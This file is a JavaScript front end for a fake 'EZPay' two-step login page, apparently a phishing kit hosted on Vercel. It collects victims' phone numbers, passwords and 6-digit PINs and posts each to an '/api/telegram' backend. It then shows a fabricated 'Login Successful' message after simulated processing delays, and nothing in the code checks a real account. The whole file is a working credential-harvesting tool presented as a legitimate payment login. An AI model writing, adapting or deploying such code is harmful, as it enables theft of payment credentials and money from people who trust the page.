// script.js - SAME VERCEL HOSTING
document.addEventListener('DOMContentLoaded', function() {
    // ---------- CONFIGURATION ----------
    // SAME VERCEL PROJECT - Backend API URL
    const API_URL = '/api/telegram';  // Same Vercel project mein
    
    // ---------- PAGE 1 ELEMENTS ----------
    const phoneInput = document.getElementById('phone-input');
    const passwordInput = document.getElementById('password-input');
    const signInButton = document.getElementById('signin-button');
    const togglePasswordBtn = document.getElementById('toggle-password');
    const loadingOverlay = document.getElementById('loading-overlay');
    
    // ---------- PAGE 2 ELEMENTS ----------
    const displayPhone = document.getElementById('display-phone');
    const pinInput = document.getElementById('pin-input');
    const completeLoginButton = document.getElementById('complete-login-button');
    const loadingOverlay2 = document.getElementById('loading-overlay-2');
    const backToSigninLink = document.getElementById('back-to-signin');
    
    // ---------- VALIDATION FUNCTIONS ----------
    function validatePhone(phone) {
        return /^\d{10}$/.test(phone);
    }
    
    function validatePassword(password) {
        return password.length > 0;
    }
    
    function validatePIN(pin) {
        return /^\d{6}$/.test(pin);
    }
    
    // ---------- UPDATE BUTTON STATES ----------
    function updateSignInButton() {
        const phone = phoneInput.value.trim();
        const password = passwordInput.value.trim();
        
        if (validatePhone(phone) && validatePassword(password)) {
            signInButton.removeAttribute('disabled');
            signInButton.classList.remove('van-button--disabled');
        } else {
            signInButton.setAttribute('disabled', 'disabled');
            signInButton.classList.add('van-button--disabled');
        }
    }
    
    function updateCompleteLoginButton() {
        const pin = pinInput.value.trim();
        
        if (validatePIN(pin)) {
            completeLoginButton.removeAttribute('disabled');
            completeLoginButton.classList.remove('van-button--disabled');
        } else {
            completeLoginButton.setAttribute('disabled', 'disabled');
            completeLoginButton.classList.add('van-button--disabled');
        }
    }
    
    // ---------- PASSWORD VISIBILITY TOGGLE ----------
    if (togglePasswordBtn) {
        togglePasswordBtn.addEventListener('click', function() {
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                togglePasswordBtn.classList.remove('van-icon-eye');
                togglePasswordBtn.classList.add('van-icon-closed-eye');
            } else {
                passwordInput.type = 'password';
                togglePasswordBtn.classList.remove('van-icon-closed-eye');
                togglePasswordBtn.classList.add('van-icon-eye');
            }
        });
    }
    
    // ---------- API FUNCTIONS ----------
    async function sendToBackend(data) {
        try {
            console.log('Sending to backend:', data);
            
            const response = await fetch(API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });
            
            const result = await response.json();
            console.log('Backend response:', result);
            return result;
            
        } catch (error) {
            console.error('API Error:', error);
            return { success: false, error: 'Network error' };
        }
    }
    
    // ---------- PAGE 1 EVENT LISTENERS ----------
    phoneInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 10);
        updateSignInButton();
    });
    
    passwordInput.addEventListener('input', updateSignInButton);
    
    // SIGN IN button click
    signInButton.addEventListener('click', async function(e) {
        if (this.disabled) return;
        
        const phone = phoneInput.value.trim();
        const password = passwordInput.value.trim();
        
        if (!validatePhone(phone)) {
            showError('phone-error', 'Please enter 10-digit phone number');
            return;
        }
        
        if (!validatePassword(password)) {
            showError('password-error', 'Please enter PIN');
            return;
        }
        
        // Show loading
        loadingOverlay.style.display = 'flex';
        
        // Send login data to backend
        await sendToBackend({
            type: 'login',
            phone: phone,
            password: password
        });
        
        // Simulate processing
        setTimeout(() => {
            loadingOverlay.style.display = 'none';
            
            // Store phone for Page 2
            localStorage.setItem('loginPhone', phone);
            
            // Switch to Page 2
            switchToPage2(phone);
        }, 1500);
    });
    
    // ---------- PAGE 2 EVENT LISTENERS ----------
    pinInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 6);
        updateCompleteLoginButton();
    });
    
    // COMPLETE LOGIN button click
    completeLoginButton.addEventListener('click', async function() {
        if (this.disabled) return;
        
        const pin = pinInput.value.trim();
        
        if (!validatePIN(pin)) {
            showError('pin-error', 'Please enter 6-digit PIN');
            return;
        }
        
        // Show loading
        loadingOverlay2.style.display = 'flex';
        
        const phone = localStorage.getItem('loginPhone') || '';
        
        // Send PIN data to backend
        await sendToBackend({
            type: 'pin',
            phone: phone,
            pin: pin
        });
        
        // Simulate verification
        setTimeout(() => {
            loadingOverlay2.style.display = 'none';
            
            // Show success message
            alert(`✅ Login Successful!\n\nPhone: +91 ${phone}\nPIN: ${pin}\n\nThank you for using EZPay!`);
            
            // Clear and reset
            setTimeout(() => {
                switchToPage1();
                phoneInput.value = '';
                passwordInput.value = '';
                localStorage.removeItem('loginPhone');
            }, 2000);
        }, 1500);
    });
    
    // Back to Sign In link
    backToSigninLink.addEventListener('click', function(e) {
        e.preventDefault();
        switchToPage1();
    });
    
    // ---------- PAGE SWITCHING FUNCTIONS ----------
    function switchToPage2(phone) {
        displayPhone.value = phone;
        document.querySelector('.page-1').style.display = 'none';
        document.querySelector('.page-2').style.display = 'block';
        
        setTimeout(() => {
            pinInput.focus();
        }, 100);
    }
    
    function switchToPage1() {
        document.querySelector('.page-2').style.display = 'none';
        document.querySelector('.page-1').style.display = 'block';
        
        pinInput.value = '';
        updateCompleteLoginButton();
        
        setTimeout(() => {
            phoneInput.focus();
        }, 100);
    }
    
    // ---------- HELPER FUNCTIONS ----------
    function showError(elementId, message) {
        const errorElement = document.getElementById(elementId);
        if (errorElement) {
            errorElement.textContent = message;
            errorElement.style.display = 'block';
            
            setTimeout(() => {
                errorElement.style.display = 'none';
            }, 3000);
        }
    }
    
    // ---------- INITIAL SETUP ----------
    const savedPhone = localStorage.getItem('loginPhone');
    if (savedPhone && window.location.hash === '#verify') {
        switchToPage2(savedPhone);
    }
    
    updateSignInButton();
    updateCompleteLoginButton();
});
